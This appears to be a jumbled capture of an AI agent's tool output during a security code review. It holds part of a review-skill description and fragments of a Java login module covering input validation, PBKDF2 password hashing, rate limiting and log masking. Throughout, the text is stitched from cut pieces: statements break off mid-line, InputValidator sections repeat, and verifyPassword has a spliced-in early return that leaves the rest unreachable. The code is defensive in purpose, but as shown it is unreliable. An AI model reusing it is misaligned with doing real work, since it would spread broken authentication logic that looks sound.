First works out\n  what the code actually does, then searches THIS skill library for the\n  specialised skills that match the code's security-relevant behaviour, then\n  applies those skills to audit the code and reports findings with CWE ids and\n  fixes. Use this whenever asked to review, audit, or security-check source\n  code, do a secure code review, find vulnerabilities, or check code against the\n  OWASP Top 10 or CWE. On its own it holds no vulnerability rules; its job is\nto understand the code under review, pull in the most relevant specialised\nskills from this same library, and apply them. This library contains hundreds\nof specialised skills (cryptographic audit, SQL injection, JWT verification,\nsecrets in source, deserialization, access control, and many more) whose\nindividual descriptions are often too narrow to self-trigger on a plain \"review\nthis code\" request. This skill is the entry point that finds and uses them.\n\n## When to Use\n\n- Any request to review, audit, or security-check source code\n- Any request to find vulnerabilities or check code against OWASP Top 10 / CWE\n- As the first step before the library's specialised application-security skills\n\n## Workflow\n\n### Step 1 - Understand the code\nRead every source file in scope. For each file, note in one or two lines what it\ndoes, and flag every security-relevant behaviour, e.g.:\n- SQL / database query construction (string building vs parameterised)\n- Cryptography: hashing, encryption, cipher mode, key/IV/salt handling, RNG\n- Authentication, sessions, password storage, tokens / JWT\n- Input handling, deserialization, file/path access, OS command execution\n- Network calls, TLS settings, secrets / credentials in source\nTurn these into a short list of keywords (e.g. \"sql injection\", \"cryptography\",\n\"jwt\", \"hardcoded secret\", \"deserialization\", \"xss\").\n\n### Step 2 - Find applicable skills (cheaply)\nThe other skills in this library are the sibling directories next to this\nskill's own directory. Do NOT read them all. Instead:\n1. Find this skill's directory, then its parent (the library root).\n2. Grep skill NAMES first for your Step 1 keywords, e.g. from the library root:\n   `ls | grep -iE 'crypto|sql|jwt|secret|deserial|xss|auth|password'`\n3. For the closest name matches, read ONLY the `description` frontmatter of\n   their SKILL.md (`sed -n '1,15p' <name>/SKILL.md`).\n\nSelect EVERY skill whose description clearly matches a security-relevant\nbehaviour you found in Step 1 - one or more per behaviour. Do NOT cap the count\nartificially: code that touches several concerns should match several skills,\nand that is expected. Order the selected skills by likely severity / relevance\nso the most important are handled first.\n\n### Step 3 - Apply each selected skill\nWork through the selected skills in priority order. Read each skill's body (and\nits `references/` files if present) only when you reach it - one at a time, not\nall up front - so that a long list of matches never exhausts context. Apply each\nskill's weakness table / checklist / verification criteria against the actual\ncode from Step 1, citing concrete `file:line` evidence for every check that\nfires. Some skills ship Python helper scripts - apply their *knowledge* to\nwhatever language the code is in; do not run their scripts against non-Python\ncode.\n\n### Step 4 - Report\nProduce a findings report:\n- One entry per issue: severity, CWE id, `file:line`, why it is a problem, and\n  the fix.\n- A \"Skills applied\" list naming the specialised skills you used.\n- For any security-relevant behaviour that had no matching library skill, review\n  it against general OWASP Top 10 / CWE knowledge and say you did so.\n- If nothing is wrong, say so explicitly and list what you checked.\n\n## Constraints\n\n- Report only. Do not create or modify any files unless explicitly asked.\n- Keep the library search cheap: grep names, skim descriptions, and fully read\n  skill bodies only as you apply them, one at a time. Never load the whole\n  library into context at once.\n\n## Verification\n\n- Every security-relevant behaviour from Step 1 is either matched to a skill and\n  checked, or explicitly reviewed against general knowledge.\n- Every finding carries a CWE id and a `file:line`.\n- The \"Skills applied\" list is present.\n","exit_code":0,"status":"completed"}}

char[] passwordChars) {\n   148\t        try {\n   149\t            if (!InputValidator.isValidEmail(email) || !InputValidator.isValidPasswordForCreation(passwordChars)) {\n   150\t com.example.auth;\n     2\t\n     3\timport java.util.Locale;\n     4\timport java.util.regex.Pattern;\n     5\t\n     6\t/**\n     7\t * Validates all inputs crossing trust boundaries.\n     8\t * Enforces strict typing, length bounds, allowed character sets, and canonicalization.\n     9\t * Prevents ReDoS, injection attacks, and resource exhaustion.\n    10\t */\n    11\tpublic final class InputValidator {\n    12\t\n    13\t    // RFC 5321 specifies 254 octets max for an email address path.\n    14\t    public static final int MIN_EMAIL_LENGTH = 3;\n    15\t    public static final int MAX_EMAIL_LENGTH = 254;\n    16\t\n    17\t    // Minimum password length for new registrations.\n    18\t    public static final int MIN_PASSWORD_LENGTH = 8;\n    19\t    // Bounded maximum password length prevents PBKDF2 CPU/memory exhaustion DoS attacks.\n    20\t    public static final int MAX_PASSWORD_LENGTH = 128;\n    21\t\n    22\t    // Bounded source/client identifier length.\n    23\t separated by dots and end with a 2-63 letter TLD.\n    27\t    private static final Pattern EMAIL_PATTERN = Pattern.compile(\n    28\t            \"^[a-zA-Z0-9_+&*-]+(?:\\\\.[a-zA-Z0-9_+&*-]+)*@(?:[a-zA-Z0-9-]+\\\\.)+[a-zA-Z]{2,63}$\"\n    29\t    );\n    30\t\n    31\t    // Source identifier pattern: alphanumeric, IPv4, IPv6, colons, dots, constraints.\n    46\t     *\n    47\t     * @param email The raw email string.\n    48\t     * @return true if valid; false otherwise.\n    49\t     */\n    50\t    public static boolean isValidEmail(String email) {\n    51\t        if (email == null) {\n    52\t            return false;\n    53\t        }\n    54\t\n    55\t        String trimmed = email.trim();\n    56\t        if (trimmed.length() < MIN_EMAIL_LENGTH || trimmed.length() > MAX_EMAIL_LENGTH) {\n    57\t            return false;\n    58\t        }\n    59\t\n    60\t        // Check for disallowed control characters or whitespace\n    61\t        for (int i = 0; i < trimmed.length(); i++) {\n    62\t            char c = trimmed.charAt(i);\n    63\t            if (c <= 0x1F || c == 0x7F || Character.isWhitespace(c)) {\n    64\t                return false;\n    65\t            }\n    66\t        }\n    67\t\n    68\t        return EMAIL_PATTERN.matcher(trimmed).matches();\n    69\t    }\n    70\t\n    71\t    /**\n    72\t     * Canonicalizes an email address by trimming and converting to lowercase using ROOT locale.\n    73\t     *\n    74\t     * @param email The validated email string.\n    75\t     * @return Canonical email string.\n    76\t     */\n    77\t    public static String canonicalizeEmail(String email) {\n    78\t        if (email == null) {\n    79\t            return \"\";\n    80\t        }\n    81\t        return email.trim().toLowerCase(Locale.ROOT);\n    82\t    }\n    83\t\n    84\t    /**\n    85\t     * Validates candidate password length for       return false;\n    94\t        }\n    95\t        return password.length >= 1 && password.length <= MAX_PASSWORD_LENGTH;\n    96\t    }\n    97\t\n    98\t    /**\n    99\t     * Validates 103\t     * @return true if valid for creation; false otherwise.\n   104\t     */\n   105\t    public static boolean isValidPasswordForCreation(char[] password) {\n   106\t        if (password == null) {\n   107\t            return false;\n   108\t        }\n   109\t        return password.length >= MIN_PASSWORD_LENGTH && password.length <= MAX_PASSWORD_LENGTH;\n   110\t    }\n   111\t\n   112\t    /**\n   113\t     * Validates and sanitizes a source identifier (e.g. IP address or client ID).\n   114\t     *\n   115\t     * @param sourceId Raw source identifier.\n   116\t     * @return Sanitized source identifier string.\n   117\t     */\n   118\t    public static String sanitizeSourceId(String sourceId) {\n   119\t        if (sourceId == null || sourceId.isBlank()) {\n   120\t            return \"unknown-source\";\n   121\t        }\n   122\t        String trimmed = sourceId.trim();\n   123\t        if (trimmed.length() > MAX_SOURCE_ID_LENGTH) {\n   124\t            trimmed = * @return true if database parameters are valid and secure; false otherwise.\n   142\t     */\n   143\t    public static boolean isValidDatabaseHashParameters(String algorithm, int iterations,\n   144\t                                                        byte[] saltBytes, byte[] hashBytes) {\n   145\t        if (algorithm == null || !algorithm.equals(PasswordHasher.ALGORITHM)) {\n   146\t != 32) { // 256 bits = 32 bytes\n   155\t            return false;\n   156\t        }\n   157\t        return true;\n   158\t    }\n   159\t}\n===== src/main/java/com/example/auth/Main.java =====\n 162\t    }\n   163\t\n   164\t    private static String readLineFromStream(InputStream in) throws IOException {\n   165\t        StringBuilder sb = new StringBuilder();\n   166\t        int b;\n throws IOException {\n   179\t        char[] buffer = new char[InputValidator.MAX_PASSWORD_LENGTH + 2];\n   180\t        int len = 0;\n   181\t        int b;\n   182\t        while ((b = in.read()) != -1) {\n   183\t            if (b == '\\n') {\n   184\t                break;\n   185\t            }\n   186\t            if (b != '\\r') {\n   187\t                if (len < InputValidator.MAX_PASSWORD_LENGTH) {\n   188\t                    buffer[len++] = (char) b;\n   189\t                }\n   190\t            }\n   191\t        }\n   192\t        char[] password = 3\timport javax.crypto.SecretKeyFactory;\n     4\timport javax.crypto.spec.PBEKeySpec;\n     5\timport java.security.MessageDigest;\n     6\timport java.security.NoSuchAlgorithmException;\n     7\timport java.security.SecureRandom;\n     8\timport java.security.spec.InvalidKeySpecException;\n     9\timport java.util.Arrays;\n    10\timport java.util.Base64;\n    11\t\n    12\t/**\n    13\t * Provides OWASP-compliant password hashing and verification using PBKDF2WithHmacSHA256.\n    14\t * Implements strict memory hygiene (zeroizing sensitive arrays) and constant-work\n    15\t * execution to prevent timing-based user enumeration attacks.\n    16\t */\n    17\tpublic final class PasswordHasher {\n    18\t\n    19\t    public static final String ALGORITHM = \"PBKDF2WithHmacSHA256\";\n    20\t    public static final int DEFAULT_ITERATIONS = 210_000;\n    21\t    public static final int SALT_BYTE_LENGTH = 16; // 128 bits\n    22\t    public static final int KEY_BIT_LENGTH = 256;  // 256 bits\n    23\t\n    24\t    private static final SecureRandom SECURE_RANDOM = new SecureRandom();\n    25\t\n    26\t    // Pre-computed static dummy values used for timing attack defense\n    27\t    private static final byte[] DUMMY_SALT = new byte[SALT_BYTE_LENGTH];\n    28\t    private static final byte[] DUMMY_HASH;\n    29\t    private static final char[] DUMMY_INPUT_PASSWORD = \"DummyFallbackPassword#2026\".toCharArray();\n    30\t\n    31\t    static {\n    32\t        SECURE_RANDOM.nextBytes(DUMMY_SALT);\n    33\t        PBEKeySpec spec = new PBEKeySpec(DUMMY_INPUT_PASSWORD, DUMMY_SALT, DEFAULT_ITERATIONS, KEY_BIT_LENGTH);\n    34\t        try {\n    35\t            SecretKeyFactory skf = SecretKeyFactory.getInstance(ALGORITHM);\n    36\t            DUMMY_HASH = skf.generateSecret(spec).getEncoded();\n    37\t        } catch (NoSuchAlgorithmException | InvalidKeySpecException e) {\n    38\t            throw new ExceptionInInitializerError(e);\n    39\t        } finally {\n    40\t            spec.clearPassword();\n    41\t        }\n    42\t    }\n    43\t\n    44\t    private final int iterations;\n    45\t\n    46\t    public PasswordHasher() {\n    47\t        this(DEFAULT_ITERATIONS);\n    48\t    }\n    49\t\n    50\t    public PasswordHasher(int iterations) {\n    51\t        if (iterations < InputValidator.MIN_PBKDF2_ITERATIONS || iterations > InputValidator.MAX_PBKDF2_ITERATIONS) {\n    52\t            throw new IllegalArgumentException(\"Iteration count out of safe range\");\n    53\t        }\n    54\t        this.iterations = iterations;\n    55\t    }\n    56\t\n    57\t    /**\n    58\t     * Hashes a password using PBKDF2WithHmacSHA256 with a cryptographically secure random salt.\n    59\t     * Intermediate key arrays are zeroized immediately after encoding.\n    60\t     *\n    61\t     * @param password Candidate password characters.\n    62\t     * @return HashResult containing Base64-encoded salt and derived key.\n    63\t     */\n    64\t    public HashResult hashPassword(char[] password) {\n    65\t        if (!InputValidator.isValidPasswordForAuth(password)) {\n    66\t            throw new IllegalArgumentException(\"Invalid password length for hashing\");\n    67\t        }\n    68\t\n    69\t        byte[] salt = new byte[SALT_BYTE_LENGTH];\n    70\t        SECURE_RANDOM.nextBytes(salt);\n    71\t        byte[] derivedKey = null;\n    72\t\n    73\t        try {\n    74\t            derivedKey = deriveKey(password, salt, this.iterations, KEY_BIT_LENGTH);\n    75\t            String saltBase64 = Base64.getEncoder().encodeToString(salt);\n    76\t            String hashBase64 = Base64.getEncoder().encodeToString(derivedKey);\n    77\t            return new HashResult(saltBase64, hashBase64, this.iterations, ALGORITHM);\n    78\t        } finally {\n    79\t            Arrays.fill(salt, (byte) 0);\n    80\t            if (derivedKey != null) {\n    81\t                Arrays.fill(derivedKey, (byte) 0);\n    82\t            }\n    83\t        }\n    84\t    }\n    85\t\n    86\t    /**\n    87\t     * Verifies a candidate password against stored hash parameters.\n    88\t     * Memory is wiped after use, and constant-time comparison is enforced.\n    89\t     *\n    90\t     * @param candidatePassword  Candidate password character array.\n    91\t     * @param storedSaltBase64   Base64-encoded salt from database.\n    92\t     * @param storedIterations   Iteration count from database.\n    93\t     * @param storedHashBase64   Base64-encoded expected hash from database.\n    94\t     * @return true if password matches; false otherwise.\n    95\t     */\n    96\t    public boolean verifyPassword(char[] candidatePassword, String storedSaltBase64,\n    97\t                                  int storedIterations, String storedHashBase64) {\n    98\t        byte[] saltBytes = null;\n    99\t        byte[] expectedHashBytes = null;\n   100\t        byte[] derivedKeyBytes = null;\n   101\t\n   102\t        try {\n   103\t            if (storedSaltBase64 == null || storedHashBase64 == null) {\n   104\t                verifyDummyPassword(candidatePassword);\n   105\t                return false;\n   106\t            }\n   107\t\n   108\t            try {\n   109\t                saltBytes = Base64.getDecoder().decode(storedSaltBase64);\n   110\t                expectedHashBytes = Base64.getDecoder().decode(storedHashBase64);\n   111\t            } catch (IllegalArgumentException e) {\n   112\t                // Malformed Base64 in database\n   113\t                verifyDummyPassword(candidatePassword);\n   114\t                return false;\n   115\t            }\n   116\t\n   117\t            return false;\n   120\t            }\n   121\t\n   122\t            if (!InputValidator.isValidPasswordForAuth(candidatePassword)) {\n   123\t                verifyDummyPassword(candidatePassword);\n   124\t                return false;\n   125\t            }\n   126\t\n   127\t            derivedKeyBytes = deriveKey(candidatePassword, saltBytes, storedIterations, KEY_BIT_LENGTH);\n   128\t            return MessageDigest.isEqual(derivedKeyBytes, expectedHashBytes);\n   129\t\n   130\t        } finally {\n   131\t            if (saltBytes != null) {\n   132\t                Arrays.fill(saltBytes, (byte) 0);\n   133\t            }\n   134\t            if (expectedHashBytes != null) {\n   135\t                Arrays.fill(expectedHashBytes, (byte) 0);\n   136\t            }\n   137\t            if (derivedKeyBytes != null) {\n   138\t                Arrays.fill(derivedKeyBytes, (byte) 0);\n   139\t            }\n   140\t        }\n   141\t    }\n   142\t\n   143\t    /**\n   144\t     * Executes a dummy key derivation and constant-time comparison to normalize execution timing\n   145\t     * when an account does not exist or input validation fails. Always returns false.\n   146\t     *\n   147\t     * @param candidatePassword The password provided, or fallback if invalid.\n   148\t     * @return Always false.\n   149\t     */\n   150\t    public boolean verifyDummyPassword(char[] candidatePassword) {\n   151\t        char[] passwordToUse = (candidatePassword != null && InputValidator.isValidPasswordForAuth(candidatePassword))\n   152\t                ? candidatePassword\n   153\t                : DUMMY_INPUT_PASSWORD;\n   154\t\n   155\t        byte[] derived = null;\n   156\t        try {\n   157\t            derived = deriveKey(passwordToUse, DUMMY_SALT, DEFAULT_ITERATIONS, KEY_BIT_LENGTH);\n   158\t            // Constant-time comparison against dummy hash to match branch execution flow\n   159\t            MessageDigest.isEqual(derived, DUMMY_HASH);\n   160\t            return false;\n   161\t        } finally {\n   162\t            if (derived != null) {\n   163\t                Arrays.fill(derived, (byte) 0);\n   164\t            }\n   165\t        }\n   166\t    }\n   167\t\n   168\t    /**\n   169\t     * Derives a cryptographic key using PBKDF2WithHmacSHA256 and clears the PBEKeySpec password copy.\n   170\t     */\n   171\t    private byte[] deriveKey(char[] password, byte[] salt, int iterations, int keyBitLength) {\n   172\t        PBEKeySpec spec = new PBEKeySpec(password, salt, iterations, keyBitLength);\n   173\t        try {\n   174\t            SecretKeyFactory skf = SecretKeyFactory.getInstance(ALGORITHM);\n   175\t            return skf.generateSecret(spec).getEncoded();\n   176\t        } catch (NoSuchAlgorithmException | InvalidKeySpecException e) {\n   177\t            throw new SecurityException(\"Cryptographic failure during PBKDF2 key derivation\", e);\n   178\t        } finally {\n   179\t            spec.clearPassword();\n   180\t        }\n   181\t    }\n   182\t}\n===== src/main/java/com/example/auth/RateLimiter.java =====\n     1\tpackage com.example.auth;\n     2\t\n     3\timport java.util.Iterator;\n     4\timport java.util.Map;\n     5\timport java.util.concurrent.ConcurrentHashMap;\n     6\timport java.util.concurrent.atomic.AtomicInteger;\n     7\t\n     8\t/**\n     9\t * Thread-safe, bounded, and atomic rate limiter for authentication attempts.\n    10\t * <p>\n    11\t * Enforces dual-level rate limiting:\n    12\t * 1. Per-source rate limiting: Blocks abusive IP/clients after repeated failures.\n    13\t * 2. Per-(source, account) rate limiting: Isolates lockout per attacker source so legitimate users\n    14\t *    are never locked out of their accounts from legitimate sources.\n    15\t * 3. Global account progressive delay: Throttles distributed brute force attacks against a single account\n    16\t *    without causing hard denial of service.\n    17\t * <p>\n    18\t * Satisfies:\n    19\t * - Rule 3: Attacker cannot use lockout mechanism to DoS legitimate users.\n    20\t * - Rule 5: Bounded memory storage with eviction prevents heap exhaustion.\n    21\t * - Rule 7: Atomic check-and-act operations prevent concurrency race conditions.\n    22\t */\n    23\tpublic final class RateLimiter {\n    24\t\n    25\t    public static final int MAX_SOURCE_ATTEMPTS = 5;\n    26\t    public static final long SOURCE_WINDOW_MS = 5 * 60 * 1000L; // 5 minutes\n    27\t\n    28\t    public static final int MAX_SOURCE_ACCOUNT_ATTEMPTS = 3;\n    29\t    public static final long SOURCE_ACCOUNT_WINDOW_MS = 5 * 60 * 1000L; // 5 minutes\n    30\t\n    31\t    public static final int GLOBAL_ACCOUNT_THROTTLE_THRESHOLD = 5;\n    32\t    public static final long GLOBAL_ACCOUNT_WINDOW_MS = 10 * 60 * 1000L; // 10 minutes\n    33\t    public static final long MAX_PROGRESSIVE_DELAY_MS = 3000L; // Maximum 3 seconds throttle\n    34\t\n    35\t    public static 42\t\n    43\t    public record RateLimitResult(Status status, long progressiveDelayMs, String reason) {\n    44\t        public boolean isAllowed() {\n    45\t            return status == Status.ALLOWED;\n    46\t        }\n    47\t    }\n    48\t\n    49\t    private static final class AttemptTracker {\n    50\t        private final long windowDurationMs;\n    51\t        private final int maxAttempts;\n    52\t        private long windowStartTime;\n    53\t        private int count;\n    54\t\n    55\t        AttemptTracker(long windowDurationMs, int maxAttempts, long now) {\n    56\t            this.windowDurationMs = windowDurationMs;\n    57\t            this.maxAttempts = maxAttempts;\n    58\t            this.windowStartTime = now;\n    59\t            this.count = 0;\n    60\t        }\n    61\t\n    62\t        synchronized boolean isExpired(long now) {\n    63\t            return now - windowStartTime > windowDurationMs;\n    64\t        }\n    65\t\n    66\t        /**\n    67\t         * Atomically evaluates and increments the attempt counter.\n    68\t         * Returns true if allowed, false if limit exceeded.\n    69\t         */\n    70\t        synchronized boolean tryAcquire(long now) {\n    71\t            if (now - windowStartTime > windowDurationMs) {\n    72\t                windowStartTime = now;\n    73\t                count = 0;\n    74\t            }\n    75\t            if (count >= maxAttempts) {\n    76\t                return false;\n    77\t            }\n    78\t            count++;\n    79\t            return true;\n    80\t        }\n    81\t\n    82\t        synchronized int getCount(long now) {\n    83\t            if (now - windowStartTime > windowDurationMs) {\n    84\t                return 0;\n    85\t            }\n    86\t            return count;\n    87\t        }\n    88\t\n    89\t        synchronized void reset() {\n    90\t            count = 0;\n    91\t            windowStartTime = 0;\n    92\t        }\n    93\t    }\n    94\t\n    95\t    private final ConcurrentHashMap<String, AttemptTracker> sourceTrackers = new ConcurrentHashMap<>();\n    96\t    private final ConcurrentHashMap<String, AttemptTracker> sourceAccountTrackers = new ConcurrentHashMap<>();\n    97\t    private final ConcurrentHashMap<String, AttemptTracker> globalAccountTrackers = new ConcurrentHashMap<>();\n    98\t    private final AtomicInteger entryCount = new AtomicInteger(0);\n    99\t\n   100\t    /**\n   101\t     * Atomically checks whether an authentication attempt is permitted and calculates any progressive delay.\n   102\t     * Check and action (count, then allow) are performed atomically.\n   103\t     *\n   104\t     * @param sourceId Sanitized client source identifier.\n   105\t     * @param email    Canonical email address.\n   106\t     * @return RateLimitResult indicating whether allowed or blocked, along with throttling delay.\n   107\t     */\n   108\t    public RateLimitResult checkAndAcquire(String sourceId, String email) {\n   109\t        long now = System.currentTimeMillis();\n   110\t        evictIfNecessary(now);\n   111\t\n   112\t        String safeSource = InputValidator.sanitizeSourceId(sourceId);\n   113\t        String safeEmail = InputValidator.canonicalizeEmail(email);\n   114\t        String sourceAccountKey = safeSource + \":\" + safeEmail;\n   115\t\n   116\t        // 1. Check and acquire source permit atomically\n   117\t        AttemptTracker sourceTracker = getOrCreateTracker(sourceTrackers, safeSource, SOURCE_WINDOW_MS, MAX_SOURCE_ATTEMPTS, now);\n   118\t        boolean sourceAllowed = sourceTracker.tryAcquire(now);\n   119\t        if (!sourceAllowed) {\n   120\t            return new RateLimitResult(Status.SOURCE_BLOCKED, 0, \"Source IP / client rate limit exceeded\");\n   121\t        }\n   122\t\n   123\t        // 2. Check and acquire (source, account) permit atomically\n   124\t        AttemptTracker sourceAccountTracker = getOrCreateTracker(sourceAccountTrackers, sourceAccountKey,\n   125\t                SOURCE_ACCOUNT_WINDOW_MS, MAX_SOURCE_ACCOUNT_ATTEMPTS, now);\n   126\t        boolean sourceAccountAllowed = sourceAccountTracker.tryAcquire(now);\n   127\t        if (!sourceAccountAllowed) {\n   128\t            return new RateLimitResult(Status.SOURCE_ACCOUNT_BLOCKED, 0,\n   129\t                    \"Too many failed attempts for this account from current source\");\n   130\t        }\n   131\t\n   132\t        // 3.            AttemptTracker globalAccountTracker = getOrCreateTracker(globalAccountTrackers, safeEmail,\n   136\t                    GLOBAL_ACCOUNT_WINDOW_MS, Integer.MAX_VALUE, now);\n   137\t GLOBAL_ACCOUNT_THROTTLE_THRESHOLD + 1;\n   140\t                progressiveDelayMs = Math.min((long) excess * 500L, MAX_PROGRESSIVE_DELAY_MS);\n   141\t            }\n   142\t        }\n   143\t\n   144\t        return new RateLimitResult(Status.ALLOWED, progressiveDelayMs, \"Attempt permitted\");\n   145\t    }\n   146\t\n   147\t    /**\n   148\t     * Records a failed authentication attempt across source, (source, account), and global account trackers.\n   149\t     */\n   150\t    public void recordAuthenticationFailure(String sourceId, String email) {\n   151\t        long now = System.currentTimeMillis();\n   152\t        String safeEmail = InputValidator.canonicalizeEmail(email);\n   153\t\n   154\t        if (!safeEmail.isEmpty()) {\n   155\t            AttemptTracker globalTracker = getOrCreateTracker(globalAccountTrackers, safeEmail,\n   156\t                    GLOBAL_ACCOUNT_WINDOW_MS, Integer.MAX_VALUE, now);\n   157\t            globalTracker.tryAcquire(now);\n   158\t        }\n   159\t    }\n   160\t\n   161\t    /**\n   162\t     * Resets failure counters upon successful authentication.\n   163\t     */\n   164\t    public void recordAuthenticationSuccess(String sourceId, String email) {\n   165\t        long now = System.currentTimeMillis();\n   166\t        String safeSource = InputValidator.sanitizeSourceId(sourceId);\n   167\t        String safeEmail = InputValidator.canonicalizeEmail(email);\n   168\t        String sourceAccountKey = safeSource + \":\" + safeEmail;\n   169\t\n   170\t        AttemptTracker sourceTracker = sourceTrackers.get(safeSource);\n   171\t        if (sourceTracker != null) {\n   172\t            sourceTracker.reset();\n   173\t        }\n   174\t\n   175\t        AttemptTracker sourceAccountTracker = sourceAccountTrackers.get(sourceAccountKey);\n   176\t        if (sourceAccountTracker != null) {\n   177\t            sourceAccountTracker.reset();\n   178\t        }\n   179\t\n   180\t        AttemptTracker globalTracker = globalAccountTrackers.get(safeEmail);\n   181\t        if (globalTracker != null) {\n   182\t            globalTracker.reset();\n   183\t        }\n   184\t    }\n   185\t\n   186\t    private AttemptTracker getOrCreateTracker(ConcurrentHashMap<String, AttemptTracker> map,\n   187\t                                              String key, long windowMs, int maxAttempts, long now) {\n   188\t        return map.computeIfAbsent(key, k -> {\n   189\t            entryCount.incrementAndGet();\n   190\t            return new AttemptTracker(windowMs, maxAttempts, now);\n   191\t        });\n   192\t    }\n   193\t\n   194\t    /**\n   195\t     * Enforces bounded memory (Rule 5). Purges expired trackers when capacity limit is reached.\n   196\t     */\n   197\t    private void evictIfNecessary(long now) {\n   198\t        if (entryCount.get() > MAX_CACHE_ENTRIES) {\n   199\t            purgeExpired(sourceTrackers, now);\n   200\t            purgeExpired(sourceAccountTrackers, now);\n   201\t            purgeExpired(globalAccountTrackers, now);\n   202\t            entryCount.set(sourceTrackers.size() + sourceAccountTrackers.size() + globalAccountTrackers.size());\n   203\t        }\n   204\t    }\n   205\t\n   206\t    private void purgeExpired(ConcurrentHashMap<String, AttemptTracker> map, long now) {\n   207\t        Iterator<Map.Entry<String, AttemptTracker>> it = map.entrySet().iterator();\n   208\t        while (it.hasNext()) {\n   209\t            Map.Entry<String, AttemptTracker> entry = it.next();\n   210\t            if (entry.getValue().isExpired(now)) {\n   211\t                it.remove();\n   212\t            }\n   213\t        }\n   214\t    }\n   215\t\n   216\t    /**\n   217\t     * Clears all trackers (useful for test isolation).\n   218\t     */\n   219\t    public void resetAll() {\n   220\t        sourceTrackers.clear();\n   221\t        sourceAccountTrackers.clear();\n   222\t        globalAccountTrackers.clear();\n   223\t        entryCount.set(0);\n   224\t    }\n   225\t}\n===== src/main/java/com/example/auth/SecurityLogger.java =====\n     1\tpackage com.example.auth;\n     2\t\n     3\timport java.util.logging.ConsoleHandler;\n     4\timport java.util.logging.Formatter;\n     5\timport java.util.logging.Level;\n     6\timport java.util.logging.LogRecord;\n     7\timport java.util.logging.Logger;\n     8\t\n     9\t/**\n    10\t * Audit and security logger.\n    11\t * Enforces:\n    12\t * - Rule 2: Passwords and secrets are never printed or logged.\n    13\t * - Rule 5: Masking of sensitive identifiers (emails masked, tokens truncated).\n    14\t * - Rule 6: Internal detailed failure reasons logged securely without exposing them to users.\n    15\t * - CWE-117 mitigation: Neutralization of Carriage Return and Line Feed (CRLF) characters to prevent log forging.\n    16\t */\n    17\tpublic final class SecurityLogger {\n    18\t\n    19\t    private static final Logger LOGGER = Logger.getLogger(SecurityLogger.class.getName());\n    20\t\n    21\t    static {\n    22\t        LOGGER.setUseParentHandlers(false);\n    23\t        ConsoleHandler handler = new ConsoleHandler();\n    24\t        handler.setLevel(Level.INFO);\n    25\t        handler.setFormatter(new Formatter() {\n    26\t            @Override\n    27\t            public String format(LogRecord record) {\n    28\t                return String.format(\"[%1$tF %1$tT.%1$tL] [%2$s] %3$s%n\",\n    29\t                        record.getMillis(),\n    30\t                        record.getLevel().getName(),\n    31\t                        record.getMessage());\n    32\t            }\n    33\t        });\n    34\t        LOGGER.addHandler(handler);\n    35\t    }\n    36\t\n    37\t    private SecurityLogger() {\n    38\t        // Utility class\n    39\t    }\n    40\t\n    41\t    /**\n    42\t     * Masks an email address for safe logging.\n    43\t     * Example: \"alice.smith@domain.com\" -> \"a***h@d***n.com\"\n    44\t     */\n    45\t    public static String maskEmail(String email) {\n    46\t        if (email == null || email.isBlank()) {\n    47\t            return \"[EMPTY_EMAIL]\";\n    48\t        }\n    49\t        int atIndex = email.indexOf('@');\n    50\t        if (atIndex <= 0 || atIndex == email.length() - 1) {\n    51\t            return \"[MALFORMED_EMAIL]\";\n    52\t        }\n    53\t\n    54\t        String localPart = email.substring(0, atIndex);\n    55\t        String domainPart = email.substring(atIndex + 1);\n    56\t\n    57\t        int dotIndex = domainPart.lastIndexOf('.');\n    58\t        String maskedDomain;\n    59\t        if (dotIndex > 0) {\n    60\t            String domainName = domainPart.substring(0, dotIndex);\n    61\t            String tld = domainPart.substring(dotIndex);\n    62\t            maskedDomain = maskSegment(domainName) + tld;\n    63\t        } else {\n    64\t            maskedDomain = maskSegment(domainPart);\n    65\t        }\n    66\t\n    67\t        String maskedLocal = maskSegment(localPart);\n    68\t        return sanitizeCrlf(maskedLocal + \"@\" + maskedDomain);\n    69\t    }\n    70\t\n    71\t    /**\n    72\t     * Truncates and masks a session token for safe logging.\n    73\t     */\n    74\t    public static String maskToken(String private InputValidator() {\n    41\t        // Utility class\n    42\t    }\n    43\t\n    44\t    /**\n    45\t     * Validates whether an email address conforms to length, character, and format constraints.\n    46\t     *\n    47\t     * @param email The raw email string.\n    48\t     * @return true if valid; false otherwise.\n    49\t     */\n    50\t    public static boolean isValidEmail(String email) {\n    51\t        if (email == null) {\n    52\t            return false;\n    53\t        }\n    54\t\n    55\t        String trimmed = email.trim();\n    56\t        if (trimmed.length() < MIN_EMAIL_LENGTH || trimmed.length() > MAX_EMAIL_LENGTH) {\n    57\t            return false;\n    58\t        }\n    59\t\n    60\t        // Check for disallowed control characters or whitespace\n    61\t        for (int i = 0; i < trimmed.length(); i++) {\n    62\t            char c = trimmed.charAt(i);\n    63\t            if (c <= 0x1F || c == 0x7F || return \"\";\n    80\t        }\n    81\t        return email.trim().toLowerCase(Locale.ROOT);\n    82\t    }\n    83\t\n    84\t    /**\n    85\t     * Validates candidate password length for       return false;\n    94\t        }\n    95\t        return password.length >= 1 && password.length <= MAX_PASSWORD_LENGTH;\n    96\t    }\n    97\t\n    98\t    /**\n    99\t     * Validates 103\t     * @return true if valid for creation; false otherwise.\n   104\t     */\n   105\t    public static boolean isValidPasswordForCreation(char[] password) {\n   106\t        if (password == null) {\n   107\t            return false;\n   108\t        }\n   109\t        return password.length >= MIN_PASSWORD_LENGTH && password.length <= MAX_PASSWORD_LENGTH;\n   110\t    }\n   111\t\n   112\t    /**\n   113\t     * Validates and sanitizes a source identifier (e.g. IP address or client ID).\n   114\t     *\n   115\t     * @param sourceId Raw source identifier.\n   116\t     * @return     // Fall back to a safe placeholder if invalid characters are present\n   130\t        return \"invalid-source-format\";\n   131\t    }\n   132\t\n   133\t    /**\n   134\t     * Validates stored PBKDF2 parameters retrieved from the database to ensure\n   135\t     * untrusted database values do not cause algorithm degradation or memory exhaustion.\n   136\t     *\n   137\t     * @param * @return true if database parameters are valid and secure; false otherwise.\n   142\t     */\n   143\t    public static boolean isValidDatabaseHashParameters(String algorithm, int iterations,\n   144\t                                                        byte[] saltBytes, byte[] hashBytes) {\n   145\t        if (algorithm == null || !algorithm.equals(PasswordHasher.ALGORITHM)) {\n   146\t            return false;\n   147\t        }\n   148\t        if (iterations < MIN_PBKDF2_ITERATIONS || iterations > MAX_PBKDF2_ITERATIONS) {\n   149\t            return false;\n   150\t        }\n   151\t        if (saltBytes == null || saltBytes.length < 16 || saltBytes.length > 64) {\n   152\t            return false;\n   153\t        }\n   154\t        if (hashBytes == null || hashBytes.length != 32) { // 256 bits = 32 bytes\n   155\t            return false;\n   156\t        }\n   157\t        return true;\n   158\t    }\n   159\t}\n===== Main.java =====\n     